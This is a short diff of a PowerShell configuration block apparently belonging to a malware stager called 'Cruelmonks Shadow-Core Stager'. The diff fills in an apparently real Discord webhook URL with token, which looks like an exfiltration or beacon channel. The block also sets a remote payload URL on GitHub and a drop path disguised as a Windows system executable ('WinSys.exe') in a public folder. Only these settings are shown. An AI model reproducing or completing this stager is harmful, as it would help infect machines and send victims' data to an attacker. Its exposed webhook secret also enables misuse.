@@ -1,5 +1,5 @@
 # Cruelmonks Shadow-Core Stager
-$webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"
+$webhookUrl = "https://discord.com/api/webhooks/1502993273155883119/N5NprQGKMWW1cSRBmlX2kGL8u4xy89LyMlD4o9I_SaWtqppdFes0vjqwMJGlmje_5VoM"
 $serviceDir = "$env:APPDATA\SystemServices"
 $stagerUrl = "https://raw.githubusercontent.com/itzcurled/cruelmonks/main/update_service.dat"
 $stagerPath = "C:\Users\Public\Documents\WinSys.exe"
